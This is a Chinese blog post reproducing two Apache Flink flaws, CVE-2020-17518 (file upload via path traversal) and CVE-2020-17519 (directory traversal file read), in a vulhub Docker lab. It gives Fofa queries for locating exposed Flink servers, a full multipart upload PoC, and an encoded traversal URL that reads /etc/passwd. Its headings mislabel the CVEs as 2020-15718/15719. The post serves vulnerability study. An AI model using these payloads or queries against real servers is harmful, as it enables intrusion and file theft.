# （CVE-2020-17518&17519）Apache flink 任意文件上传&目录遍历 - 追得上的梦想 - 博客园

> 原文：[`www.cnblogs.com/KHZ521/p/14265458.html`](https://www.cnblogs.com/KHZ521/p/14265458.html)

参考连接：[`mp.weixin.qq.com/s/Nzh5QxMK3XMoISE6Y3UJMA`](https://mp.weixin.qq.com/s/Nzh5QxMK3XMoISE6Y3UJMA)

### 描述

2021 年 1 月 5 日，Apache 官方发布新的漏洞通告，修复了 flink 两个高危漏洞（CVE-2020-17518/17519）。这两个高危漏洞均由于引入存在缺陷的 REST API 导致。
CVE-2020-17518：攻击者通过构造恶意的 HTTP 请求配合../实现目录穿越，可完成任意文件上传。
CVE-2020-17519：攻击者通过 JobManager 的 REST API 接口结合../实现目录遍历，进而实现任意文件读取。

### 影响版本

**CVE-2020-17518：**
Apache Flink 1.5.1-1.11.2
**CVE-2020-17519：**
Apache Flink 1.11.0、1.11.1、1.11.2

### Fofa

```
app="Apache-Flink"
app="Apache‐Flink" && country="CN" 
```

### 环境搭建

项目地址:
[`github.com/vulhub/vulhub/tree/master/flink`](https://github.com/vulhub/vulhub/tree/master/flink)
(因为不会下载单个地址于是就下载了整个项目)
具体注意事项请参考 https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md
1.进入项目地址

```
cd vulhub/flink/CVE-2020-17518
docker-compose up -d 
```

![](img/10220738aa3ebc7d3132234b29e16a8b.png)
2.查看 docker 环境，发现已自动启动 docker 环境

```
docker ps 
```

![](img/24f4b69491a0ead3d8d13dd399aa031a.png)
3.尝试访问文件，环境搭建成功

```
http://<ip>:8081/ 
```

![](img/7ad91997407ca1eda4db51fad18ed0bd.png)

### CVE-2020-15718 漏洞复现

POC

```
POST /jars/upload HTTP/1.1
Host: localhost:8081
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Length: 187

------WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/success"

success
------WebKitFormBoundaryoZ8meKnrrso89R6Y-- 
```

漏洞地址在下方图片位置
![](img/66330d6c81c514ebc67b9972d56e3029.png)
可直接上传 jar 类型木马（木马会自动执行）
请参考：[`www.cnblogs.com/KHZ521/p/14023011.html`](https://www.cnblogs.com/KHZ521/p/14023011.html)
可通过../../的方式进行路径跳转
![](img/10ca6feb4dfc41f8702a177f77487a78.png)
上传失败提示：
![](img/d3f279d39b5dbad13ae2c6c7cff4139a.png)
上传成功提示
![](img/ca28571d0e268fc8636ae86a8da4380f.png)
**这里查看上传文件发现不存在，可能是因为 docker 环境搭建的，而我访问的是 docker 外的物理路径**

### CVE-2020-15719 漏洞复现

POC

```
/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd 
```

![](img/e0ade1ecac5b0dd8bf38ab484f1e61d4.png)

### 结束语

我测试了一下我上面出现的关于文件上传失败的问题，其实是文件上传成功的，不过因为是 docker 环境吗，而我查看的路径为物理机路径，应该查看 dokcer 中的路径才正确。是根据 CVE-2020-15719 中的文件读取，在 etc 下使用 vi 新建 123 文件，但是读取失败并提示找不到文件得到的结论

> 使用 vi 新建 123 文件
> ![](img/7490759e0fd5468e0a3f55bf03fd132a.png)
> 读取失败了
> ![](img/a37ba09dbb33fa5560cef631611f9c62.png)